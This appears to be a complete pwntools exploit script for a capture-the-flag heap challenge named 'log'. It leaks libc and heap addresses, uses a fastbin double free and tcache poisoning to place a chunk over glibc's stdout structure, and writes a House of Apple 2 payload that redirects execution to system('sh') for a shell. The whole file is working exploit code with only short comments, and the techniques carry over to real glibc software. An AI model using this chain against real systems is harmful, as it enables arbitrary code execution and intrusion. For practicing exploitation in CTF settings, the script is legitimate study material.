#!/usr/bin/env python3

from pwn import *

elf = ELF("./log_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("log.challs.olicyber.it", 29006)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b add_request
                                b remove_request
                                b show_request
                                b system
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    # Alloc chunk 0
    r.sendafter(b">", p32(0))
    r.send(p32(0x420))
    r.send(b'a'*0x420)

    # Free chunk 0
    r.sendafter(b">", p32(2))
    r.send(p32(0))

    # Read libc address from chunk 0 metadata
    r.sendafter(b">", p32(1))
    r.send(p32(0))
    r.recvn(9)
    libc_leak = u64(r.recvn(8))
    libc.base = libc_leak - libc.sym["main_arena"] - 96
    log.success(f"Libc base: {hex(libc.base)}")
    log.success(f"&_IO_2_1_stdout_: {hex(libc.base + libc.sym["_IO_2_1_stdout_"])}")

    # Re-Alloc chunk 0
    r.sendafter(b">", p32(0))
    r.send(p32(0x420))
    r.send(b'a'*0x420)

    # Alloc chunk 1 to prevent consolidation and to fill tcache 0xa0
    r.sendafter(b">", p32(0))
    r.send(p32(0x50))
    r.send(b'b'*0x50)

    # Alloc chunk 2
    r.sendafter(b">", p32(0))
    r.send(p32(0x420))
    r.send(b'c'*0x420)

    # Free chunk 0
    r.sendafter(b">", p32(2))
    r.send(p32(0))

    # Free chunk 2
    r.sendafter(b">", p32(2))
    r.send(p32(2))

    # Read heap address from chunk 2 metadata
    r.sendafter(b">", p32(1))
    r.send(p32(2))
    r.recvn(9)
    heap_leak = u64(r.recvn(8))
    log.success(f"Heap leak: {hex(heap_leak)}")

    # Clean unsorted bins
    r.sendafter(b">", p32(0))
    r.send(p32(0x420))
    r.send(b'p'*0x420)

    # Alloc chunks to fill tcache 0xa0
    for i in range(8):
        r.sendafter(b">", p32(0))
        r.send(p32(0x50))
        r.send(f'{chr(ord('d')+i)}'.encode()*0x50)

    # Fill tcache 0xa0
    r.sendafter(b">", p32(2))
    r.send(p32(1))
    for i in range(6):
        r.sendafter(b">", p32(2))
        r.send(p32(4))

    # Fastbin DUP
    r.sendafter(b">", p32(2))
    r.send(p32(5))

    r.sendafter(b">", p32(2))
    r.send(p32(4))

    r.sendafter(b">", p32(2))
    r.send(p32(5))

    # At this point, requests[4] contains the double freed chunk
    for i in range(8): # 8 and not 7 because there is an unsorted bin still present
        r.sendafter(b">", p32(0))
        r.send(p32(0x50))
        r.send(b'z'*0x50)

    # Re-Alloc requests[4]
    r.sendafter(b">", p32(0))
    r.send(p32(0x50))
    r.send(p64(((heap_leak+0x7F0)>>12)^(heap_leak+0xCF0)) + b'z'*0x48)

    for i in range(3):
        r.sendafter(b">", p32(0))
        r.send(p32(0x50))
        r.send(b'za'*(0x50//2))

    # This chunk will be freed and then its fw changed to &_IO_2_1_stdout_
    r.sendafter(b">", p32(0))
    r.send(p32(0xf0)) # 0x100
    r.send(b'd'*0xf0)

    # This is needed to increment the tcache 0x100 count to 2
    r.sendafter(b">", p32(0))
    r.send(p32(0xf0)) # 0x100
    r.send(b'e'*0xf0)

    r.sendafter(b">", p32(2))
    r.send(p32(25))

    r.sendafter(b">", p32(2))
    r.send(p32(26))

    r.sendafter(b">", p32(0))
    r.send(p32(0x50))
    r.send(p64(((heap_leak+0xB10)>>12)^(libc.base + libc.sym["_IO_2_1_stdout_"])) + b'a'*0x48)

    # useless, needed to extract last item from 0x100 tcache
    r.sendafter(b">", p32(0))
    r.send(p32(0xf0))
    r.send(b'm'*0xf0)

    log.info("Sending payload...")

    stdout_addr = libc.base + libc.sym['_IO_2_1_stdout_']
    system_addr = libc.base + libc.sym['system']
    wfile_jumps = libc.base + libc.sym['_IO_wfile_jumps']

    # House of Apple 2 payload (Exactly 0xf0 / 240 bytes)
    payload = flat({
        0x00: b"  sh\x00\x00\x00\x00",      # fp->_flags (Command for system)
        0x28: p64(1),                       # fp->_IO_write_ptr (Must be > write_base to trigger flush)
    
        0x88: p64(stdout_addr + 0x40),   # fp->_lock, needs to be NULL 
    
        0xa0: p64(stdout_addr),            # fp->_wide_data 
    
        0xd8: p64(wfile_jumps),            # fp->vtable 
    
        0xe0: p64(stdout_addr + 0x80),     # fake _wide_vtable pointer
    
        # Wide vtable pointer + 0x68 -> 'doallocate' function.
        0xe8: p64(system_addr) 
    
    }, filler=b'\x00') # Gaps are filled with null bytes

    # this will be allocated at &_IO_2_1_stdout_
    r.sendafter(b">", p32(0))
    r.send(p32(0xf0))
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()
